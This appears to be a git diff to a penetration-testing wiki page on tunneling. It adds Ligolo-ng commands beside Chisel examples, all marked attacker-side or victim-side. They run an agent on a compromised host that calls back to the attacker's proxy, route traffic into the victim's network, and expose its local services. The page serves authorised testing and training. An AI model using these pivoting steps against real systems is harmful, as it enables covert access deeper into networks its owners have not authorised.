@@ -271,12 +271,60 @@ You need to use the **same version for client and server**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-
 ### Port forwarding
 
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+
+## [Ligolo-ng](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html?highlight=chisel#ligolo-ng)
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Use the same version for agent and proxy**
+
+### [Tunneling](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html?highlight=chisel#tunneling)
+
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+
+### [Agent Binding and Listening](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html?highlight=chisel#agent-binding-and-listening)
+
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
+```
+
+### [Access Agent's Local Ports](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html?highlight=chisel#access-agents-local-ports)
+
+
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
 
 ## Rpivot
